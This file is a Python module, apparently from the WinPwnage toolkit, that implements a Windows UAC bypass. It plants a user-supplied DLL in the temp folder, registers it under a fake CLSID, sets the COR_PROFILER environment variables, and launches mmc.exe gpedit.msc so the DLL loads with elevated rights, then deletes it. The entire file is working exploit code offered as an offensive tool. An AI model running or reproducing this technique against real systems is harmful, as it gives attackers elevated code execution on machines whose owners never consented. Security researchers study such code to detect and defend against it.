import os
import time
import tempfile
import _winreg
from winpwnage.core.prints import *
from winpwnage.core.utils import *

corprofiler_info = {
	"Description": "Bypass UAC using .NET (DLL) by modifying COR profiler valaues",
	"Id": "25",
	"Type": "UAC bypass",
	"Fixed In": "999999",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "corprofiler",
	"Function Payload": True,
}


def corprofiler(payload):
	if payloads().dll(payload):
		try:
			payload_data = open(os.path.join(payload), "rb").read()
		except Exception as error:
			return False

		try:
			dll_file = open(os.path.join(tempfile.gettempdir(), "payload.dll"), "wb")
			dll_file.write(payload_data)
			dll_file.close()
		except Exception as error:
			return False

		time.sleep(5)

		if os.path.isfile(os.path.join(tempfile.gettempdir(),"payload.dll")) == True:
			try:
				key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
										os.path.join("Software\\Classes\\CLSID\\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\\InprocServer32"))
				_winreg.SetValueEx(key, None, 0, _winreg.REG_EXPAND_SZ, os.path.join(tempfile.gettempdir(), "payload.dll"))
				_winreg.CloseKey(key)
			except Exception as error:
				print_error("Unable to create CLSID key, exception was raised: {}".format(error))
				return False
			else:
				print_success("Successfully created CLSID key containing payload ({})".format(os.path.join(tempfile.gettempdir(), "payload.dll")))
	
			try:
				key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Environment"))
				_winreg.SetValueEx(key, "COR_PROFILER", 0, _winreg.REG_SZ,"{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}")
				_winreg.CloseKey(key)
			except Exception as error:
				print_error("Unable to add CLSID to environment variable COR_PROFILER, exception was raised: {}".format(error))
				return False
			else:
				print_success("Successfully added CLSID to environment variable COR_PROFILER")
				
			try:
				key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Environment"))
				_winreg.SetValueEx(key, "COR_ENABLE_PROFILING", 0, _winreg.REG_SZ,"1")
				_winreg.CloseKey(key)
			except Exception as error:
				print_error("Unable to add environment variable COR_ENABLE_PROFILING, exception was raised: {}".format(error))
				return False
			else:
				print_success("Successfully added environment variable COR_ENABLE_PROFILING")
	
			try:
				key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Environment"))
				_winreg.SetValueEx(key, "COR_PROFILER_PATH", 0, _winreg.REG_SZ,os.path.join(tempfile.gettempdir(),"payload.dll"))
				_winreg.CloseKey(key)
			except Exception as error:
				print_error("Unable to add environment variable COR_PROFILER_PATH, exception was raised: {}".format(error))
				return False
			else:
				print_success("Successfully added environment variable COR_PROFILER_PATH")

			if process().create("mmc.exe", params="gpedit.msc") == True:
				print_success("Successfully executed (mmc.exe gpedit.msc) dll file should been loaded")
			else:
				print_error("Unable to execute (mmc.exe gpedit.msc) exception was raised: {}".format(error))
				return False

			if os.path.isfile(os.path.join(tempfile.gettempdir(), "payload.dll")) == True:
				try:
					os.remove(os.path.join(tempfile.gettempdir(), "payload.dll"))
				except Exception as error:
					print_error("Unable to clean up, manual cleaning is needed!")
					return False
				else:
					print_success("Successfully cleaned up, enjoy!")
